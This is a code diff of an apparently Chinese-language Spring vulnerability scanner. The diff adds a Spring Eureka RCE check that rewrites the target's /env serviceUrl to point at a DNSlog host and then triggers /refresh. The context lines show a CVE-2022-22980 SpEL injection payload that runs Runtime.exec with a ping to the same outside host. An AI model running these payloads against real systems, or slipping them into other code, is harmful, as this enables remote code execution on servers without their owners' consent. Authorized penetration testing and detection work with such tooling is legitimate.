@@ -140,9 +140,28 @@ else:
     print('#'"[-5-]" + url + '目标不存在CVE-2017-8046漏洞')
     print("########################################################")
 
+print('')
+##Spring eureka RCE
+eureka_rce_header={
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0',
+    'Content-Type': 'application/x-www-form-urlencoded'
+}
+eureka_rce_data='eureka.client.serviceUrl.defaultZone=http://'+dnslog
+eureka_r1=requests.post(url=url+'env',data=eureka_rce_data,headers=eureka_rce_header)
+if eureka_r1.status_code==200:
+    eureka_r2=requests.post(url=url+'refresh',headers=eureka_rce_header,)
+    if eureka_r2.status_code==200:
+        print(colorama.Fore.CYAN + "[+6+]" + url + '可能存在Spring eureka RCE漏洞，返回终端看有无Dnslog请求')
+        print("########################################################")
+else:
+    print('#'"[-6-]" + url + '目标不存在Spring eureka RCE漏洞')
+    print("########################################################")
+
+
+
 ##cve_2022_22980
 print('')
-print(colorama.Fore.CYAN+'cve-2022-22980正在验证中，请稍等')
+print('cve-2022-22980正在验证中，请稍等')
 cve_2022_22980_path='demo'
 cve_2022_22980_data='keyword=T(java.lang.Runtime).getRuntime().exec("ping '+dnslog+'")'
 cve_2022_22980_headers={
@@ -152,11 +171,16 @@ cve_2022_22980_headers={
 cve_2022_22980_r=requests.post(url=url+cve_2022_22980_path,headers=cve_2022_22980_headers,data=cve_2022_22980_data)
 
 if cve_2022_22980_r.status_code==500:
-    print(colorama.Fore.CYAN + "[+6+]" + url + '可能存在CVE-2022-22980，返回终端看有无Dnslog请求')
+    print(colorama.Fore.CYAN + "[+7+]" + url + '可能存在CVE-2022-22980，返回终端看有无Dnslog请求')
     print("########################################################")
 else:
-    print('#'"[-6-]" + url + '目标不存在CVE-2022-22980漏洞')
+    print('#'"[-7-]" + url + '目标不存在CVE-2022-22980漏洞')
     print("########################################################")
+
+
+
+
+
 
 
 
